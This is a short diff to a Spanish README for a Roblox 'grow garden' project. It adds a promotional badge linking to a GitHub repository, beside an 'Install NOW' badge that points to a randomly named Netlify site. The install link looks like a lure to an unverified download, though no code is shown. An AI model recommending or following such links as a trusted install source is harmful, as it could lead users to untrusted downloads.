@@ -36,6 +36,10 @@ Inspirar a principiantes con recursos accesibles para construir simulaciones de 
 **🎉 ¡Crece Hoy!**  
 ¡Desata tu potencial con **RobloxGrowGarden**!  
 
+
+-
+[![Descubre Ahora](https://img.shields.io/badge/Descubre-AHORA-9C27B0)](https://github.com/GreenGrowHub/GreenGrowHub)  
+
 [![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 
 
